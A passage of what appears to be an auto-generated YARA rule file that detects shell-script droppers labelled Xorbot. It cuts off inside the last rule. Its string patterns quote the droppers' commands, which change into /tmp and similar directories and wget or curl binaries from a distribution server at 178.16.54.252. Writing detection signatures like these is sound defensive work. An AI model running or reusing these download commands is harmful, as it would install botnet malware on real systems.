      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Hx1wAN1FJqL5jm3LFelViBm9yaN8fbUq4S; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/x4zkTxjWZgRFmlj0TC0kL846eb9GRTjH9F; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oqGm5DA2QwHUsyJ9ne6Q4Rk2NgXvMFsN5y; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/jI6BgNkgCtyMIYMPuQXoDIIytQFM6UX88u; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/1MDpk7HCIK0pMSlcvcsDeqz3RXjCjBdW1n; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/MQvKyRHziNUr84aClK2FgWcpfrTNOjTzqP; curl -O  http://178.16.54.252/bins/MQvKyRHziNUr84aClK2FgWcpfr" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__12f497f7 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_12f497f7.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "12f497f7cb517552b0291ab93983c56fa1f0659ebc536ecb577b112b6c0ece90"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/mDetRFYnD1qxxsJFwDZxQJBNRVeXt2Mivm; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/txGwRdSWu6gzzYzUjXVGIXb9cXRT5KZn7n; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/7UIZ9UUPZA8eFhdUa8WQHaKwhcxO90r9yn; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/O8nf9He2dVy82V5vRCUusPoTrL2r5EaeJJ; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/wmc8SgkylzlLBJCu6d0AQVrqxJFHixBtKj; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Jxwsad4m9fOSH5NWVZEqO2uGUG1yrmiepW; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/BC8ir7ry2lpIdIQAnmykyfaK0LJ4P4uCK3; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/0nrQePkhBb60sFIDYtyPDqxkmyp4esQ8qN; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xMVmp4lGV2pdNfDA1N7BlRqlLEBR3C58lq; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/SqAWAlg0VOjMYD9PJX9h6y6Fi3KkhV0fSs; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/d8oNkUi0XVaE76mdgOd3MfDx0tIE4lJgt4; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/sDFzcsksqAps5z5l5mlBYvE1IYjFRZlOzn; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/JOqvTXnjFN0p0ZVUuk5lR8nPPDx8aGrcJa; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PppB03j6Neidv9Tjeza0YMalLHij3uFkW7; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/mDetRFYnD1qxxsJFwDZxQJBNRVeXt2Mivm; curl -O  http://178.16.54.252/bins/mDetRFYnD1qxxsJFwDZxQJBNRV" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__263e1935 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_263e1935.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "263e1935f828cc02affcd06a06a131ba9757c2403046c5b0a959149337836cd5"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/H6DXGvREhd0wyfskRUjBZG6Cx2ULSeobLx; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xAFhRqeHDm6Bq3xVWlWbjQ0S0yUrLBBOxg; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/C5DWbZ2JiTTfvHjwOfS28VJRAZVQm5cExP; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/UgnK8IzAEtgfSS4I4bzRA3Bvv6VmrhQUN5; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/3zLn37E1HdssOPEAgeVmcNpPqNHiuIPE6P; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/B45RuKte21Txbrg4RU7EffCbS1NHQdGE4G; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/l9PBLEJXk2RWdsK4ZfzmY0Cf84JfpkL5NE; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/NZL91nJDRoeHETDAuLNSAQxdxYrN5jqhfr; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/5jJAkTX5Emua8Z7cn3vmslu0JXFGvOC2PY; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/jVSR3t5KiPCqRTEvjiUVyYireLq7SZvkuK; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/tgtkNTQXmaTi2PgamnZWCKXBJEfGkpsdbm; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/We5S8Cdr0XJXIXE6BdJtDnaT6LHrLaAqRC; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/dyUE58kaX0Dp6pnZXuJSSWvuOfVG8lZd9b; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/KadhTccLco6QaKmtfE78TnyV16fnjWj8u9; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/NZL91nJDRoeHETDAuLNSAQxdxYrN5jqhfr; curl -O  http://178.16.54.252/bins/NZL91nJDRoeHETDAuLNSAQxdxY" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__298ba5ca {
   meta:
      description = "_subset_batch - file Xorbot(signature)_298ba5ca.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "298ba5cab2c31cfb6169dac633aaf1eb0711da247ba01b41b14a20b3bb6bb4e7"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Zqm08RZQFhH5Bwjvw6udL5yq7dX1PS5kfC; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/RI8C8zdh0FKkx82RnmwqWKFRLdQLb3LD0E; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/8d4mqwrKE1Hh8w0eVqwxolgcBBmawcp5aH; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/RQoRZLmAvVUkwMIVIygLMEnM5XqI3TUOTo; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/2FBoDiI3kJ4xXoZ2SGWBDWbomIWmuikWD6; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/bQ5f9II4mLPB4z4IMasz0jCTMxGBUfoUsy; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xxaRiBqZm0viCSXOQ1SNb464190H71iAug; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/cW9tQkaGmaxn34LxwyDQuAkG2224ouKYAd; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/OXlMtaFpxGfQlvFfxR0wFTos2su8P6MwNr; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/gedhLHOKEN2Sq8OUnuenIkcqYxxEZFfkJr; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/aSDN50udOGBQTWU5QgBbtyNPAos43coNfc; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/wPsC8AdzbNK9Icvl9Nu4QUFf52aWUjmKnG; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/RQoRZLmAvVUkwMIVIygLMEnM5XqI3TUOTo; curl -" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xxaRiBqZm0viCSXOQ1SNb464190H71iAug; curl -" ascii /* score: '27.00'*/
      $s15 = "wget http://178.16.54.252/bins/2FBoDiI3kJ4xXoZ2SGWBDWbomIWmuikWD6; curl -O  http://178.16.54.252/bins/2FBoDiI3kJ4xXoZ2SGWBDWbomI" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__2a2c27e0 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_2a2c27e0.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2a2c27e00ac870041a2e0d1dc3c8a53fc83d8d80b9d89bfa47bb8d4aab32e28a"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/7b15WZD29O03KLGI0mX3L8r53dJvIGz8Iv; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/zBiHVwz6kMwneHmhGwWZMEhblEWAuBuW2B; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ZByPyjB19t8vllSJvXPePLx5rNUKeLY2vA; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/bO8soJjJvFRVtnFK2IGgQHWURKq07gmp1p; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oQL8rTUyTR8l0HhyV4ii9cYe1GgdyWZ2aY; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/7AzWhu4XIHACgGK603jQsV4xGULGDe3FKB; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/mQw2hoWft8GajlDBlBLshPJJeBUabBMXK3; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/LQbqjlAXw0ohRBZyMykENFx6kKl8aPG0Pl; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/eGw3OSBnwIDZLEVYbCr1vKIlMrbQpxVxG5; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/5FJtijpKTzx6GAEujAw5jkEWdL4wRvWeDj; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/G28nML6u385ZaR7LfVj1FJmgqlcgOYQEA5; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/jOe4yfHykyqGgzBU7n1400Q2OY4oTDILiT; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/5mtqfLPYKZqBHGaGXZ0IXKv7YGMb5XFFM8; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/VvquHckpBGKBpakgFv1coKf6c7z0w6QhnA; curl -" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oQL8rTUyTR8l0HhyV4ii9cYe1GgdyWZ2aY; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__33d295df {
   meta:
      description = "_subset_batch - file Xorbot(signature)_33d295df.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "33d295df2b9d8c401abfb35685829ca37180c4b8add9437d8b2232358172f527"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/0fLOZeTrdksLjMiTZFn0WQ2DtcTYVkzUHz; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/dKopNq7OUM0fEEGbA2TOOaNFkAgeTVXybR; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/gbrfH2fSwfGJjLpBM9fL7Ti6jQqn4yEqEr; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/j40vj5wJEYyERGNRWT8SC8PGkXlD2I97lN; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ggVapt2bvEarSQo9Fm7cYYXGEGVOMoPtbw; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/9NLzeSBZaD1u15OFQELosAKe3nY6n3cvE2; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/EtGgFTrWxrTTZfRzY2gTqazyJMjmABBPsl; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/5Qq4c5w2fa0NRIYbqQaZdiEwhe3cjW3yqF; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/LluE96wuCBTYiQgiXF1yq7L1rW9WCf57xL; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/fDjur6mv8FCPrgYzVlwxiywgZzZGZneUvC; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/DC6u5yv45OFyAfyi2cCZvaS6lDLNa318Wt; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/LVb7xPTDzFkC7ZZ3t3VoKGwbjG6b2DzO6B; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/hv1Ol9uqb4f98opEEO6WF1uCVtYWM0OlPd; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/jULuS8HvG4mwc6MBwNh5TcFlMhlAtICPHP; curl -" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/5Qq4c5w2fa0NRIYbqQaZdiEwhe3cjW3yqF; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__37cab3eb {
   meta:
      description = "_subset_batch - file Xorbot(signature)_37cab3eb.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "37cab3ebafda0159e1d69cfc04076035d2f31a385c2790380bce0258fe7a738a"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/e3gPPyKJNRw1tpyOqvKV6ip5KFF0bNCB8S; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/tJDkWeJDlDxISzXNKtPUpFuU1OmghNa5Ke; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xwzuDxPJ3pV2p91VBFG99osrnEto0s81Eu; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Xv6eDIgj56c7ombGhc6yqemReKz2B9jhnD; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/5Q0sargFU9CxeYTlkhI5TH8Cu7PD61QFKt; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/SlJnWDFeLWHZ2miVoaahJ9u9CEpv5sR6aQ; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PLxNSd7NlpUDMSGXt2yGbA3SFGwUcmRJ92; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/3UHdnYq5zCf3x6ah8C95PTvWWSLK9S4tq9; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Ov3InYuD6feHRLGYRsEwKsPXdUVoyeyzdO; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/UC9mXqHRmJ1uZHulUYvCJW5ok0O9sNC51Q; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/e5FsQKJy8ffPPdNSOfndhVviw6Us3tAG2W; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/MKStZ55kiN47rwy1owHu4OOALTuJktmQzl; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Ov3InYuD6feHRLGYRsEwKsPXdUVoyeyzdO; curl -" ascii /* score: '27.00'*/
      $s14 = "wget http://178.16.54.252/bins/MKStZ55kiN47rwy1owHu4OOALTuJktmQzl; curl -O  http://178.16.54.252/bins/MKStZ55kiN47rwy1owHu4OOALT" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/e3gPPyKJNRw1tpyOqvKV6ip5KFF0bNCB8S; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__39b1f225 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_39b1f225.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "39b1f2256267d3496d493eb09d3f4e027b5b135c17f4de68fdb1cccf019ecfc0"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/hthsn88JlpInBssocxjsIxNjiVXX9wDadB; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/EVbwcl8sZdHgr8K7AhirbU7hFAtXNucsAq; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/01tCB0nQfGSarJoHMUbrrgxtXpAP83bm1W; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/IggcCl2YXtEJLr61jmOIHXJql5SdvYVO98; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Ks8CMrizoh4tGzpOYmUO21BGkyIobQBsdz; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/f0qhU6gUQmBnWvBBLcBC1TE2O4D9vzBrGR; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/yEbWGyyQM6JWeYAUpN8zFewWSiQutvTo4z; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vYbfvbRND9Kcb1dZsyF0If3dZNtannOdfy; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ECOjJPgYG4a2oX9t3gl9KOnYwrGJwlrKJR; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/89A8mBXFcE4DHF9aXMu17Gm9yD2LuqlH9h; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/jJNvXnheKjia4n3fikJ1Qu9l6NrmabKl4b; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/wRQoNkQYE0KUn8WL0OFa2ZuKF0yaNoma7j; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/lWDRKb2tGgHB98jlSaysZJBrC0OxpNSYJa; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/6r9vnh3ZIjjQhxjAubj0lIgYJDdZrF5y4N; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/lWDRKb2tGgHB98jlSaysZJBrC0OxpNSYJa; curl -O  http://178.16.54.252/bins/lWDRKb2tGgHB98jlSaysZJBrC0" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__3e2197a8 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_3e2197a8.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3e2197a8bbd1c278c5112d51f4a5510c12e0a1c3cd08cdc64bcd818b87c99201"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/yJE7MSZwaEKTOU7pokIFqadlYl7bhd3vNM; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/54EzFT98rA1WfXGeraFGW53QZfsMbP1356; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/aQtz1RZXj8IOhnfcy08ByJ1SSuBY2SIGKQ; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/u2udox1nFVMk7lzE1Gtin2KGBp8U2HSdBK; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/zMw0VexKKmngHUMArwR9Qrboy6T5IGbyQo; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/S1lNu2d8o8XjugnX67JJJVOqHAs3VUCwVe; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/U1kLOCttGxnSlgnJpG2MasMnRlhTmB5ROM; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/cOmAGD9FPLn3vZjqwgN1ud7m5uUqULxmZO; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/tLjOuD5jGMbKD7bhcDFjKn16c23BAFFqH4; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/nNcDwZFLVW6gvmzbliO23aE7wvpKyQv9Ep; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/f6vwgJ4nibXuMKWliVAMfmtd6Oi8bWXiW5; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/1j2o8E3cRGnaWUsaT3MiaCDcDkQAoN3Qvp; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/D8NAJmHInRHWjzYRxzPfUCUYDW9K8ev6fz; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/TcBt1nnlgE5IKy1T1C3yjQxLwoRAAwgWFy; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/yJE7MSZwaEKTOU7pokIFqadlYl7bhd3vNM; curl -O  http://178.16.54.252/bins/yJE7MSZwaEKTOU7pokIFqadlYl" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__46ec4a52 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_46ec4a52.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "46ec4a527c7d5af8e03783c60de49a97d2dfe2d69a6fde11e2f3b9d08b32fa88"
   strings:
